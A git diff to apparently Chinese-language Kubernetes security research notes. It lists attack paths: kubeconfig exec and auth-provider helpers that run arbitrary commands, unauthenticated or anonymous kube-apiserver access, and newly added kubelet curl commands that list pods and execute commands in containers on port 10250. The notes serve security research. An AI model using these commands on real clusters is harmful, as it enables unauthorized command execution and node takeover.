@@ -44,37 +44,55 @@ excerpt: Kubernetes Security Research
 
 - Prerequisites
 	- attacker control the kubeconfig
-- Flow
+- Flow<br>
 while cluster manager service use user provided kubeconfig to manage user's k8s cluster, a malicious user can use kubectl authentication helpers to execute arbitrary command when kubeconfig is loaded
 	- exec helper<br>
-	```yaml
-  user:
-    exec:
-      args: [...]
-      command: ...
-      env: {...}
-	```
+```yaml
+user:
+  exec:
+    args: [...]
+    command: ...
+    env: {...}
+```
 	- gcp helper<br>
-	```yaml
-  user:
-    auth-provider:
-      config:
-        cmd-args: ...
-        cmd-path: ...
-      name: gcp
-	```
+```yaml
+user:
+  auth-provider:
+    config:
+      cmd-args: ...
+      cmd-path: ...
+    name: gcp
+```
 
 #### kube-apiserver unauthenticated access
 - Prerequisites
 	- `--insecure-port` is not set to 0
-- Flow
+- Flow<br>
 attacker access kube-apiserver insecure port, such as 8080
 
 #### kube-apiserver anonymous access
 - Prerequisites
 	- `--anonymous-auth` not set or set to true
-- Flow
+- Flow<br>
 attacker can access kube-apiserver without credentials
+
+#### kubelet unauthenticated access
+> https://github.com/cyberark/kubeletctl
+
+- Prerequisites
+	- `--anonymous-auth` not set or set to true
+	- `--read-only-port` not set to 0
+	- `--authorization-mode` not set to `Webhook`
+- Flow<br>
+when attacker can access kubelet, such as run commands or trigger ssrf in pod, he can fetch metrics information from 10255, control node from 10250
+	- get all pods information<br>
+```shell
+curl -sk --connect-timeout 5 https://${ip}:10250/pods
+```
+	- select privileged container to execute command<br>
+```shell
+curl -sk --connect-timeout 5 https://${ip}:10250/run/${namespace}/${pod}/${container} -d "cmd=xxx"
+```
 
 ## 组件安全
 
